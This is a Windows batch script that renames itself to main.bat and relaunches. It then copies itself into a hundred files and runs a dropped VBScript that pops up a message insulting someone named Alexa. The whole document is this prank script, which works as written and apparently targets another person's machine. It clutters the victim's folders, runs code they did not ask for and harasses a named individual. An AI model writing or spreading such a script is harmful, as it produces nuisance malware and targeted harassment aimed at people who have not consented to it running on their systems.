@echo off
set "targetName=main.bat"
if /i "%~nx0"=="%targetName%" (
    goto :X
)
if exist "%targetName%" (
    echo Error: %targetName% already exists. Cannot rename.
    pause
    exit /b
)
ren "%~nx0" "%targetName%"
start "" "%targetName%" & exit
:X
for /L %%i in (1,1,100) do ( 
  copy main.bat main%%i.bat
)
echo msgbox "hello alexa idot" > %temp%\dumb.vbs
start %temp%\dumb.vbs
